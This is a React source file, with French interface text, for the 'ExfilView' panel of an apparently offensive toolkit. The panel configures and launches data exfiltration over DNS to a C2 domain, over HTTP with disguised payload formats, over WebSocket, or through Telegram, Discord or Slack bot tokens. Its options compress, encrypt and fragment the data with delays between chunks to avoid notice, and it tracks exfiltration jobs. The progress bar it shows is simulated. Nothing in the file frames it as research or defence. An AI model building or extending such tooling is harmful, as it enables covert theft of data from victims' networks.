/**
 * ExfilView — Exfiltration via DNS · HTTP · WebSocket · Social
 */
import { useState, useEffect, useRef } from 'react'
import { apiFetch } from '../utils/auth'

const CHANNELS = ['DNS', 'HTTP', 'WebSocket', 'Social']

const DISGUISE_TYPES = ['json', 'form', 'image', 'binary', 'plain']
const PLATFORMS = ['Telegram', 'Discord', 'Slack']

function ChannelConfig({ channel, config, onChange }) {
  const inp = (label, key, placeholder) => (
    <div style={{ marginBottom: 10 }}>
      <div style={{ fontSize: '0.65rem', color: 'var(--text3)', marginBottom: 3 }}>{label}</div>
      <input
        value={config[key] || ''}
        onChange={e => onChange({ ...config, [key]: e.target.value })}
        placeholder={placeholder}
        style={{ width: '100%', padding: '7px 10px', background: '#000820', border: '1px solid var(--border2)', borderRadius: 8, color: 'var(--text)', fontSize: '0.78rem' }}
      />
    </div>
  )

  if (channel === 'DNS') return (
    <div>
      {inp('Domaine C2', 'domain', 'c2.example.com')}
      {inp('Serveur DNS', 'dns_server', '8.8.8.8')}
    </div>
  )

  if (channel === 'HTTP') return (
    <div>
      {inp('Endpoint', 'endpoint', 'https://example.com/api')}
      <div style={{ marginBottom: 10 }}>
        <div style={{ fontSize: '0.65rem', color: 'var(--text3)', marginBottom: 3 }}>Méthode</div>
        <select value={config.method || 'POST'} onChange={e => onChange({ ...config, method: e.target.value })}
          style={{ width: '100%', padding: '7px 10px', background: '#000820', border: '1px solid var(--border2)', borderRadius: 8, color: 'var(--text)', fontSize: '0.78rem' }}>
          {['GET', 'POST', 'PUT', 'PATCH'].map(m => <option key={m} value={m}>{m}</option>)}
        </select>
      </div>
      <div>
        <div style={{ fontSize: '0.65rem', color: 'var(--text3)', marginBottom: 3 }}>Déguisement</div>
        <select value={config.disguise || 'json'} onChange={e => onChange({ ...config, disguise: e.target.value })}
          style={{ width: '100%', padding: '7px 10px', background: '#000820', border: '1px solid var(--border2)', borderRadius: 8, color: 'var(--text)', fontSize: '0.78rem' }}>
          {DISGUISE_TYPES.map(d => <option key={d} value={d}>{d}</option>)}
        </select>
      </div>
    </div>
  )

  if (channel === 'WebSocket') return (
    <div>
      {inp('WebSocket URL', 'ws_url', 'wss://example.com/ws')}
    </div>
  )

  if (channel === 'Social') return (
    <div>
      <div style={{ marginBottom: 10 }}>
        <div style={{ fontSize: '0.65rem', color: 'var(--text3)', marginBottom: 3 }}>Plateforme</div>
        <select value={config.platform || 'Telegram'} onChange={e => onChange({ ...config, platform: e.target.value })}
          style={{ width: '100%', padding: '7px 10px', background: '#000820', border: '1px solid var(--border2)', borderRadius: 8, color: 'var(--text)', fontSize: '0.78rem' }}>
          {PLATFORMS.map(p => <option key={p} value={p}>{p}</option>)}
        </select>
      </div>
      {inp('Clé API / Token', 'api_key', 'Bot token ou API key…')}
      {inp('Channel / Chat ID', 'channel_id', 'Channel ou Chat ID')}
    </div>
  )

  return null
}

export default function ExfilView() {
  const [channel,    setChannel]    = useState('DNS')
  const [config,     setConfig]     = useState({})
  const [dataText,   setDataText]   = useState('')
  const [dataFile,   setDataFile]   = useState(null)
  const [compress,   setCompress]   = useState(false)
  const [encrypt,    setEncrypt]    = useState(false)
  const [fragment,   setFragment]   = useState(false)
  const [chunkSize,  setChunkSize]  = useState(256)
  const [delay,      setDelay]      = useState(100)
  const [running,    setRunning]    = useState(false)
  const [progress,   setProgress]   = useState(0)
  const [latency,    setLatency]    = useState(null)
  const [testOk,     setTestOk]     = useState(null)
  const [testLoading,setTestLoading]= useState(false)
  const [jobs,       setJobs]       = useState([])
  const [error,      setError]      = useState('')
  const fileRef = useRef(null)

  useEffect(() => {
    apiFetch('/exfil/jobs').then(r => r.json()).then(d => setJobs(d.jobs || [])).catch(() => {})
    const t = setInterval(() => {
      apiFetch('/exfil/jobs').then(r => r.json()).then(d => setJobs(d.jobs || [])).catch(() => {})
    }, 5000)
    return () => clearInterval(t)
  }, [])

  const testChannel = async () => {
    setTestLoading(true); setTestOk(null); setLatency(null); setError('')
    const t0 = Date.now()
    try {
      const r = await apiFetch('/exfil/test', {
        method: 'POST',
        body: JSON.stringify({ channel: channel.toLowerCase(), config }),
      })
      const d = await r.json()
      setTestOk(d.success || r.ok)
      setLatency(d.latency_ms || (Date.now() - t0))
    } catch { setTestOk(false) }
    setTestLoading(false)
  }

  const startExfil = async () => {
    setError('')
    if (!dataText && !dataFile) { setError('Entrer du texte ou uploader un fichier'); return }
    setRunning(true); setProgress(0)

    const formData = new FormData()
    formData.append('channel', channel.toLowerCase())
    formData.append('config', JSON.stringify(config))
    formData.append('options', JSON.stringify({ compress, encrypt, fragment, chunk_size: chunkSize, delay_ms: delay }))
    if (dataText)  formData.append('data', dataText)
    if (dataFile)  formData.append('file', dataFile)

    try {
      const token = localStorage.getItem('eye_token') || ''
      const res = await fetch('/api/exfil/send', {
        method: 'POST',
        headers: { Authorization: `Bearer ${token}` },
        body: formData,
      })
      if (!res.ok) throw new Error('Échec de l\'exfiltration')
      // Simule la progression pour les canaux sans feedback
      let p = 0
      const t = setInterval(() => {
        p = Math.min(p + Math.random() * 15, 95)
        setProgress(p)
      }, 300)
      await res.json()
      clearInterval(t)
      setProgress(100)
      apiFetch('/exfil/jobs').then(r => r.json()).then(d => setJobs(d.jobs || [])).catch(() => {})
    } catch (e) { setError(e.message) }
    setRunning(false)
  }

  const CHANNEL_ICONS = { DNS: '🌐', HTTP: '🔗', WebSocket: '⚡', Social: '✈' }
  const STATUS_COLOR = { success: '#4ade80', failed: '#ef4444', running: '#fbbf24', pending: '#94a3b8' }

  return (
    <div style={{ padding: 24, maxWidth: 960, margin: '0 auto' }}>
      {/* Header */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 12, marginBottom: 24 }}>
        <span style={{ fontSize: 28 }}>📤</span>
        <div>
          <div style={{ fontSize: '1.1rem', fontWeight: 800, color: 'var(--accent)', letterSpacing: 2 }}>
            EXFILTRATION
          </div>
          <div style={{ fontSize: '0.65rem', color: 'var(--text3)', letterSpacing: 1 }}>
            DNS · HTTP · WebSocket · Social
          </div>
        </div>
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 20 }}>
        {/* Left: Config */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>

          {/* Channel tabs */}
          <div style={{ background: 'var(--glass)', border: '1px solid var(--border)', borderRadius: 12, padding: 16 }}>
            <div style={{ fontSize: '0.7rem', color: 'var(--text3)', letterSpacing: 1, marginBottom: 12 }}>CANAL DE SORTIE</div>
            <div style={{ display: 'flex', gap: 4, marginBottom: 14 }}>
              {CHANNELS.map(c => (
                <button key={c} onClick={() => { setChannel(c); setConfig({}) }} style={{
                  flex: 1, padding: '8px 0', borderRadius: 8,
                  background: channel === c ? 'var(--glow2)' : 'transparent',
                  border: `1px solid ${channel === c ? 'var(--border2)' : 'var(--border)'}`,
                  color: channel === c ? 'var(--accent)' : 'var(--text2)',
                  cursor: 'pointer', fontSize: '0.7rem', fontWeight: 600,
                }}>
                  {CHANNEL_ICONS[c]} {c}
                </button>
              ))}
            </div>
            <ChannelConfig channel={channel} config={config} onChange={setConfig} />

            {/* Test button */}
            <button onClick={testChannel} disabled={testLoading} style={{
              width: '100%', marginTop: 8, padding: '8px 0',
              background: '#38bdf820', border: '1px solid #38bdf850',
              borderRadius: 8, color: '#38bdf8', cursor: 'pointer', fontSize: '0.78rem', fontWeight: 700,
            }}>
              {testLoading ? '⟳ Test…' : '📡 Tester le canal'}
            </button>
            {testOk !== null && (
              <div style={{
                marginTop: 8, padding: '6px 12px', borderRadius: 6, fontSize: '0.72rem',
                background: testOk ? '#4ade8015' : '#ef444415',
                color: testOk ? '#4ade80' : '#ef4444',
                border: `1px solid ${testOk ? '#4ade8030' : '#ef444430'}`,
              }}>
                {testOk ? `✓ Canal OK — Latence: ${latency}ms` : '✗ Canal injoignable'}
              </div>
            )}
          </div>

          {/* Options */}
          <div style={{ background: 'var(--glass)', border: '1px solid var(--border)', borderRadius: 12, padding: 16 }}>
            <div style={{ fontSize: '0.7rem', color: 'var(--text3)', letterSpacing: 1, marginBottom: 12 }}>OPTIONS</div>
            {[
              { key: 'compress', label: '🗜 Compresser', state: compress, set: setCompress },
              { key: 'encrypt',  label: '🔒 Chiffrer',   state: encrypt,  set: setEncrypt  },
              { key: 'fragment', label: '✂ Fragmenter', state: fragment, set: setFragment },
            ].map(opt => (
              <div key={opt.key} style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 10 }}>
                <span style={{ fontSize: '0.78rem', color: 'var(--text2)' }}>{opt.label}</span>
                <div onClick={() => opt.set(v => !v)} style={{
                  width: 36, height: 20, borderRadius: 10, cursor: 'pointer',
                  background: opt.state ? 'var(--accent)' : '#ffffff20', position: 'relative', transition: 'background 0.2s',
                }}>
                  <div style={{
                    position: 'absolute', top: 2, left: opt.state ? 18 : 2, width: 16, height: 16,
                    borderRadius: '50%', background: '#fff', transition: 'left 0.2s',
                  }} />
                </div>
              </div>
            ))}
            {fragment && (
              <div style={{ marginTop: 4 }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.72rem', color: 'var(--text2)', marginBottom: 4 }}>
                  <span>Taille chunk</span><span style={{ color: 'var(--accent)' }}>{chunkSize} B</span>
                </div>
                <input type="range" min={64} max={4096} step={64} value={chunkSize}
                  onChange={e => setChunkSize(Number(e.target.value))}
                  style={{ width: '100%', accentColor: 'var(--accent)', marginBottom: 8 }}
                />
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.72rem', color: 'var(--text2)', marginBottom: 4 }}>
                  <span>Délai entre chunks</span><span style={{ color: 'var(--accent)' }}>{delay} ms</span>
                </div>
                <input type="range" min={0} max={2000} step={50} value={delay}
                  onChange={e => setDelay(Number(e.target.value))}
                  style={{ width: '100%', accentColor: 'var(--accent)' }}
                />
              </div>
            )}
          </div>
        </div>

        {/* Right: Data + Launch */}
        <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>

          {/* Data source */}
          <div style={{ background: 'var(--glass)', border: '1px solid var(--border)', borderRadius: 12, padding: 16 }}>
            <div style={{ fontSize: '0.7rem', color: 'var(--text3)', letterSpacing: 1, marginBottom: 12 }}>SOURCE DE DONNÉES</div>
            <textarea
              value={dataText} onChange={e => setDataText(e.target.value)}
              placeholder="Données à exfiltrer…"
              style={{
                width: '100%', height: 120, padding: '10px 12px', background: '#000820',
                border: '1px solid var(--border2)', borderRadius: 8, color: 'var(--text)',
                fontSize: '0.8rem', fontFamily: 'monospace', resize: 'vertical',
              }}
            />
            <div style={{ marginTop: 10, display: 'flex', gap: 10, alignItems: 'center' }}>
              <span style={{ fontSize: '0.72rem', color: 'var(--text3)' }}>ou uploader un fichier :</span>
              <input type="file" ref={fileRef} style={{ display: 'none' }}
                onChange={e => setDataFile(e.target.files[0])} />
              <button onClick={() => fileRef.current?.click()} style={{
                padding: '6px 14px', background: '#a78bfa20', border: '1px solid #a78bfa50',
                borderRadius: 6, color: '#a78bfa', cursor: 'pointer', fontSize: '0.72rem',
              }}>📁 Choisir un fichier</button>
              {dataFile && (
                <span style={{ fontSize: '0.68rem', color: '#4ade80' }}>{dataFile.name}</span>
              )}
            </div>
          </div>

          {/* Launch */}
          <div style={{ background: 'var(--glass)', border: '1px solid var(--border)', borderRadius: 12, padding: 16 }}>
            <div style={{ fontSize: '0.7rem', color: 'var(--text3)', letterSpacing: 1, marginBottom: 12 }}>LANCER L'EXFILTRATION</div>
            {error && <div style={{ color: '#ef4444', fontSize: '0.75rem', marginBottom: 8 }}>⚠ {error}</div>}
            {running && (
              <div style={{ marginBottom: 12 }}>
                <div style={{ display: 'flex', justifyContent: 'space-between', fontSize: '0.7rem', color: 'var(--text2)', marginBottom: 4 }}>
                  <span>Envoi en cours…</span><span>{Math.round(progress)}%</span>
                </div>
                <div style={{ height: 6, background: '#ffffff10', borderRadius: 3 }}>
                  <div style={{ height: '100%', width: `${progress}%`, background: 'var(--accent)', borderRadius: 3, transition: 'width 0.3s' }} />
                </div>
              </div>
            )}
            {progress === 100 && !running && (
              <div style={{ background: '#4ade8015', border: '1px solid #4ade8030', borderRadius: 8, padding: '8px 12px', marginBottom: 10, color: '#4ade80', fontSize: '0.78rem' }}>
                ✓ Exfiltration terminée
              </div>
            )}
            <button onClick={startExfil} disabled={running} style={{
              width: '100%', padding: '11px 0', background: running ? '#ffffff10' : '#ef444430',
              border: `1px solid ${running ? 'transparent' : '#ef4444'}`,
              borderRadius: 8, color: running ? 'var(--text3)' : '#ef4444',
              cursor: 'pointer', fontWeight: 800, fontSize: '0.88rem',
            }}>
              {running ? '⟳ Exfiltration en cours…' : '📤 Exfiltrer via ' + channel}
            </button>
          </div>

          {/* Job History */}
          <div style={{ background: 'var(--glass)', border: '1px solid var(--border)', borderRadius: 12, padding: 14, flex: 1 }}>
            <div style={{ fontSize: '0.7rem', color: 'var(--text3)', letterSpacing: 1, marginBottom: 10 }}>
              HISTORIQUE ({jobs.length})
            </div>
            {jobs.length === 0 ? (
              <div style={{ textAlign: 'center', padding: '20px 0', color: 'var(--text3)', fontSize: '0.75rem' }}>
                Aucun job
              </div>
            ) : (
              <div style={{ maxHeight: 200, overflowY: 'auto', display: 'flex', flexDirection: 'column', gap: 6 }}>
                {jobs.map((j, i) => (
                  <div key={i} style={{ display: 'flex', gap: 8, padding: '7px 10px', background: '#ffffff06', borderRadius: 6, fontSize: '0.72rem', alignItems: 'center' }}>
                    <span style={{ color: STATUS_COLOR[j.status] || '#94a3b8', fontWeight: 700 }}>●</span>
                    <span style={{ color: 'var(--text2)' }}>{CHANNEL_ICONS[j.channel] || '?'} {j.channel}</span>
                    <span style={{ color: 'var(--text3)', flex: 1 }}>{j.size_bytes ? `${j.size_bytes}B` : ''}</span>
                    <span style={{ color: 'var(--text3)' }}>{j.created_at?.slice(11, 16)}</span>
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      </div>
    </div>
  )
}
